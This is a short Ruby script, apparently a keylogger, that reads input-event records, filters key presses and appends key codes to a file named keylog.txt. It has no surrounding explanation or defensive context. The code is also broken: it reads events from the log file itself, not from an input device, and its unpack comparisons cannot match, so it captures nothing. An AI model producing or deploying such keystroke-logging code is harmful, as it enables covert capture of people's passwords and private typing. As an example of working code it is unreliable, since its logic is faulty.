require 'io/console'

def log_keystrokes
  begin
    File.open("keylog.txt", "rb") do |file|
      while true
        data = file.read(24) # Read 24 bytes (one event)
        type, code, value = data[16..17].unpack("S"), data[18..19].unpack("S"), data[20..23].unpack("L")
        if type == 1 && value == 1 # Key press event
          File.open("keylog.txt", "a") do |log|
            log.puts "Key code: #{code}"
          end
        end
      end
    end
  rescue => e
    puts "An error occurred: #{e.message}"
  end
end

log_keystrokes
